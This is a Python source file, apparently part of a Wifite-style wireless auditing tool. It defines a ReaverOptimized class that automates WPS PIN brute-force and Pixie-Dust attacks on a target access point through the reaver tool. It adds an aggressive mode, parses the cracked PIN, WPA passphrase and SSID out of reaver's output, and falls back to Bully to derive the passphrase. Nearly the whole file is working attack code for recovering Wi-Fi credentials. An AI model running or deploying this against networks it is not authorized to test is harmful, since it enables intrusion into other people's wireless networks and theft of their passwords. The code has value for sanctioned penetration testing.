#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .dependency import Dependency
from .airodump import Airodump
from .bully import Bully
from ..model.attack import Attack
from ..config import Configuration
from ..model.wps_result import CrackResultWPS
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer

import os, time, re, threading

class ReaverOptimized(Attack, Dependency):
    dependency_required = False
    dependency_name = 'reaver'
    dependency_url = 'https://github.com/t6x/reaver-wps-fork-t6x'

    def __init__(self, target, pixie_dust=True, aggressive=False):
        super(ReaverOptimized, self).__init__(target)

        self.pixie_dust = pixie_dust
        self.aggressive = aggressive
        
        self.progress = '0.00%'
        self.state = 'Initializing'
        self.locked = False
        self.total_attempts = 0
        self.total_timeouts = 0
        self.total_wpsfails = 0
        self.last_pins = set()
        self.last_line_number = 0
        self.crack_result = None

        self.output_filename = Configuration.temp('reaver_opt.out')
        if os.path.exists(self.output_filename):
            os.remove(self.output_filename)

        self.output_write = open(self.output_filename, 'a')
        self.reaver_cmd = self._build_optimized_command()
        self.reaver_proc = None

    def _build_optimized_command(self):
        """Build optimized reaver command"""
        cmd = [
            'reaver',
            '--interface', Configuration.interface,
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '-vv',
            '--timeout', '10',  # Faster timeout
            '--retries', '0',   # No retries
            '--dh-small'        # Faster computation
        ]

        if self.pixie_dust:
            cmd.extend(['--pixie-dust', '1'])

        if self.aggressive:
            cmd.extend([
                '--quiet',
                '--unlock'
            ])

        return cmd

    @staticmethod
    def is_pixiedust_supported():
        try:
            output = Process(['reaver', '-h']).stderr()
            return '--pixie-dust' in output
        except:
            return False

    def run(self):
        try:
            self._run()
        except Exception as e:
            self.pattack('{R}Failed: {O}%s{W}' % str(e), newline=True)
            return False
        finally:
            if self.reaver_proc and self.reaver_proc.poll() is None:
                self.reaver_proc.interrupt()
            if self.output_write:
                self.output_write.close()

        return self.crack_result is not None

    def _run(self):
        self.start_time = time.time()
        timeout = Configuration.wps_pixie_timeout if self.pixie_dust else 600

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='reaver_opt',
                      aggressive=True) as airodump:

            self.pattack('Waiting for target...')
            self.target = self.wait_for_target(airodump)

            self.reaver_proc = Process(self.reaver_cmd,
                    stdout=self.output_write,
                    stderr=Process.devnull())

            try:
                self.reaver_proc.stdin('y\n')
            except:
                pass

            # Start output parser thread
            parser_thread = threading.Thread(target=self._parse_output_thread, daemon=True)
            parser_thread.start()

            # Main loop
            while self.crack_result is None and self.reaver_proc.poll() is None:
                try:
                    self.target = self.wait_for_target(airodump)
                except:
                    pass

                stdout = self.get_output()
                self.state = self.parse_state(stdout)
                self.parse_failure(stdout)
                self.pattack(self.get_status())
                self.crack_result = self.parse_crack_result(stdout)

                if self.running_time() > timeout:
                    raise Exception('Timeout after %d seconds' % timeout)

                if self.locked and not Configuration.wps_ignore_lock:
                    raise Exception('WPS Locked')

                time.sleep(0.3)

            # Final check
            if self.crack_result is None:
                stdout = self.get_output()
                self.crack_result = self.parse_crack_result(stdout)

    def _parse_output_thread(self):
        """Parse output in background thread"""
        try:
            for line in iter(self.reaver_proc.pid.stdout.readline, b''):
                if not line:
                    continue
                try:
                    line = line.decode('utf-8', errors='ignore')
                except:
                    continue

                if Configuration.verbose > 1:
                    Color.pe('\n{P}[reaver] %s' % line.strip())
        except:
            pass

    def parse_crack_result(self, stdout):
        if self.crack_result:
            return self.crack_result

        pin, psk, ssid = self.get_pin_psk_ssid(stdout)

        if pin:
            if psk:
                self.pattack('{G}PIN: {C}%s{W} PSK: {C}%s{W}' % (pin, psk), newline=True)
            else:
                self.pattack('{G}PIN: {C}%s{W}' % pin, newline=True)
                try:
                    psk = Bully.get_psk_from_pin(self.target, pin)
                    if psk:
                        self.pattack('{G}PSK: {C}%s{W}' % psk, newline=True)
                except:
                    pass

            if pin:
                self.crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
                self.crack_result.dump()
                return self.crack_result

        return None

    def parse_failure(self, stdout):
        if 'WPS pin not found' in stdout:
            raise Exception('PIN not found')

        self.total_wpsfails = stdout.count('WPS transaction failed')
        if self.total_wpsfails >= Configuration.wps_fail_threshold:
            raise Exception('Too many failures')

        self.total_timeouts = stdout.count('Receive timeout')
        if self.total_timeouts >= Configuration.wps_timeout_threshold:
            raise Exception('Too many timeouts')

    def parse_state(self, stdout):
        state = self.state
        last_line = stdout.split('\n')[-1] if stdout else ''

        if 'Waiting for beacon' in last_line:
            state = 'Waiting for beacon'
        elif 'Associated with' in last_line:
            state = 'Associated'
        elif 'Trying pin' in last_line or 'Trying PIN' in last_line:
            state = 'Trying PIN'
        elif 'Sending M' in last_line or 'Received M' in last_line:
            state = 'Authenticating'

        # Parse progress
        percentages = re.findall(r"([0-9.]+%) complete", stdout)
        if percentages:
            self.progress = percentages[-1]

        # Parse lockout
        if 'rate limiting' in stdout.lower() or 'lockout' in stdout.lower():
            self.locked = True

        return state

    def get_status(self):
        status = ''
        if not self.pixie_dust:
            status = '(%s) ' % self.progress
        
        status += self.state

        if self.total_timeouts > 0:
            status += ' {O}TO:%d{W}' % self.total_timeouts
        if self.total_wpsfails > 0:
            status += ' {O}Fail:%d{W}' % self.total_wpsfails
        if self.locked:
            status += ' {R}LOCKED{W}'

        return status

    def pattack(self, message, newline=False):
        if self.pixie_dust:
            time_left = Configuration.wps_pixie_timeout - self.running_time()
        else:
            time_left = self.running_time()

        time_msg = Timer.secs_to_str(time_left)
        Color.clear_entire_line()
        Color.pattack('WPS', self.target, 'Pixie-Dust' if self.pixie_dust else 'PIN',
                '{W}[%s] %s' % (time_msg, message))
        if newline:
            Color.pl('')

    def running_time(self):
        return int(time.time() - self.start_time)

    def get_output(self):
        if not self.output_filename or not os.path.exists(self.output_filename):
            return ''

        try:
            if self.output_write:
                self.output_write.flush()
            with open(self.output_filename, 'r') as f:
                return f.read().strip()
        except:
            return ''

    @staticmethod
    def get_pin_psk_ssid(stdout):
        pin = psk = ssid = None

        regex = re.search(r"WPS (?:pin|PIN):\s*'?([0-9]+)'?", stdout, re.IGNORECASE)
        if regex:
            pin = regex.group(1)

        regex = re.search(r"(?:WPA|WPS) PSK:\s*'(.+?)'", stdout)
        if regex:
            psk = regex.group(1)

        regex = re.search(r"AP SSID:\s*'(.*?)'", stdout)
        if regex:
            ssid = regex.group(1)
        elif not ssid:
            regex = re.search(r"ESSID:\s*([^)]+)", stdout)
            if regex:
                ssid = regex.group(1)

        return (pin, psk, ssid)

    def stop(self):
        if hasattr(self, 'reaver_proc') and self.reaver_proc and self.reaver_proc.poll() is None:
            self.reaver_proc.interrupt()

    def __del__(self):
        self.stop()

# Use optimized version
Reaver = ReaverOptimized
